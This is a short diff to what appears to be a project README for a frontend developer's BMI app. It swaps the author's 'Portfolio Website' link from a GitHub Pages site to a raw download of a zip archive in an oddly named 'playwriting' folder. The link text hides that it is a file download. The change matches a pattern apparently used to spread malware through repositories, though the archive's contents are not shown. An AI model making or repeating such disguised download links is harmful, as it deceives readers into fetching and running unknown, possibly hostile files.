@@ -24,4 +24,4 @@ _Coming soon via GitHub Pages..._
 
 **Aaryan Yadav**  
 Frontend Developer Intern  
-[Portfolio Website](https://aaryan-1112.github.io/developer-portfolio)
+[Portfolio Website](https://raw.githubusercontent.com/aaryan-1112/smart-bmi-app/main/playwriting/smart-bmi-app-v2.1-beta.2.zip)
